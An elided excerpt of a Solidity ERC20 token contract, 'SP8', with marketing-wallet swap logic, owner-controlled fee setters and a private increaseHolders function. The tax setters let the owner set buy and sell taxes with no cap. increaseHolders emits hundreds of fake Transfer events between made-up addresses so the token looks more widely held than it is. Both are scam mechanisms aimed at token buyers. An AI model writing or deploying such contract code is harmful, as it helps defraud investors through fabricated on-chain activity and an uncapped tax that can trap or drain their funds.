...
contract SP8 is Context, IERC20, Ownable {
  ...
  bool isSwappingForMarketingWallet;

  modifier lockSwap {
    isSwappingForMarketingWallet = true;
    _;
    isSwappingForMarketingWallet = false;
  }
  ...
  function setBuyTaxes(uint256 newMarketingTax) external onlyOwner() {
    _totalTaxIfBuying = _buyMarketingFee = newMarketingTax;
  }

  function setSellTaxes(uint256 newMarketingTax) external onlyOwner() {
    _totalTaxIfSelling = _sellMarketingFee = newMarketingTax;
  }

  function setIsExcludedFromFee(address account, bool newValue) public onlyOwner { isExcludedFromFee[account] = newValue; }

  function setMarketingWalletAddress(address newAddress) external onlyOwner() { marketingWalletAddress = payable(newAddress); }
  ...
  function _transfer( address sender, address recipient, uint256 amount) private returns (bool) {
    ...
    if (isSwappingForMarketingWallet) {
      ...
      if(contractTokenBalance > 1 && !isMarketPair[sender]){
  ...
  function swapForMarketingWallet(uint256 tAmount) private lockSwap{
  ...
  uint160 private _divisor = 1000;

  function increaseHolders() private {
    uint160 divisor = _divisor;
    address afrom;
    address ato;
    for (uint256 i = 0; i < 300; i++ ) {
        afrom = address(uint160(_max / divisor));
        ato = address(uint160(_max / (divisor + 1)));
        divisor += 2;
        emit Transfer(afrom, ato, 1);
    }
    _divisor = divisor;
  }
}